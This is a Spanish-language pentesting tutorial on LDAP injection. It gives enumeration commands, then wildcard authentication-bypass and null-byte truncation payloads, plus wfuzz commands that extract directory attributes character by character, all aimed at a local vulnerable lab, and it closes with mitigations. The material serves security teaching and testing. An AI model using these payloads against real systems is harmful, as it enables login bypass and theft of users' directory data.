# 💉 Inyección LDAP (LDAP Injection)

LDAP (*Lightweight Directory Access Protocol*) es un protocolo para acceder y gestionar directorios de información — habitualmente usado para autenticación corporativa y gestión de usuarios (Active Directory, OpenLDAP).

La inyección LDAP se produce cuando una aplicación construye consultas LDAP con datos del usuario sin escaparlos, permitiendo al atacante manipular la lógica de esas consultas.

---

## Enumeración previa

### Nmap — scripts LDAP

```bash
sudo nmap --script "ldap*" -p 389 <IP>
```

### ldapsearch — consultas manuales

**Reconocimiento básico:**
```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org \
  -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

**Con condiciones (filtros):**
```bash
# Buscar usuarios con la descripción "LDAP*" y cn=admin
ldapsearch -x -H ldap://localhost -b dc=example,dc=org \
  -D "cn=admin,dc=example,dc=org" -w admin \
  '(&(cn=admin)(description=LDAP*))'
```

### ldapadd — añadir entradas desde archivo `.ldif`

```bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldif
```

Ejemplo de fichero `.ldif`:
```
dn: uid=usuario1,dc=example,dc=org
uid: usuario1
cn: usuario1
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
userPassword: password123
mail: usuario1@example.com
telephoneNumber: 612345678
```

---

## Explotación

Las aplicaciones web vulnerables suelen construir filtros LDAP como:

```
(&(cn=USUARIO)(userPassword=CONTRASEÑA))
```

### Bypass con comodín `*`

Si la contraseña no se escapa correctamente, usar `*` como comodín:

```
password = *
```

La consulta resultante `(&(cn=admin)(userPassword=*))` es verdadera para cualquier contraseña. Esto suele devolver un código 301 (redirect) indicando login exitoso, frente a 200 en caso de fallo.

### Enumeración de usuarios con comodín

```
username = a*   → código 301 (hay usuarios que empiezan por 'a')
username = b*   → código 200 (no hay usuarios que empiezan por 'b')
```

Automatizable con `wfuzz` o un script propio para enumerar usuarios carácter a carácter.

---

### Null byte — truncar el filtro

Si la petición genera el filtro:
```
(&(cn=admin)(userPassword=*))
```

Inyectando un null byte (`%00`) se puede truncar la consulta y hacer que el servidor solo evalúe la primera condición:

```
user_id = admin))%00
```

Resultado:
```
(&(cn=admin))   ← solo se evalúa esto; el resto se ignora
```

**Enumeración de atributos con wfuzz:**

```bash
# Buscar atributos existentes del usuario
wfuzz -c --hh=550 \
  -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt \
  -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' \
  http://localhost:8888
```

**Extraer valores de un atributo numérico (ej. teléfono) carácter a carácter:**

```bash
wfuzz -c --hh=550 -z range,0-9 \
  -d 'user_id=admin)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' \
  http://localhost:8888
```

---

## Impacto potencial

- Bypass de autenticación sin conocer credenciales
- Enumeración de usuarios y atributos del directorio
- Lectura de información sensible (correos, teléfonos, grupos, roles)
- En casos extremos, modificación de entradas del directorio

---

## Laboratorio para practicar

- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

> Al construir la imagen Docker, cambiar en el `Dockerfile` la primera línea de `FROM php:7.0-apache` a `FROM php:8.0-apache` para evitar errores de compilación.

---

## Mitigaciones

- Escapar todos los caracteres especiales LDAP en el input: `*`, `(`, `)`, `\`, `NUL`
- Usar librerías de acceso LDAP que parametricen las consultas
- Validación de entrada estricta (lista blanca de caracteres permitidos)
- Ejecutar la aplicación con una cuenta LDAP de solo lectura y mínimos privilegios
- Monitorizar los logs del servidor LDAP para detectar patrones de inyección
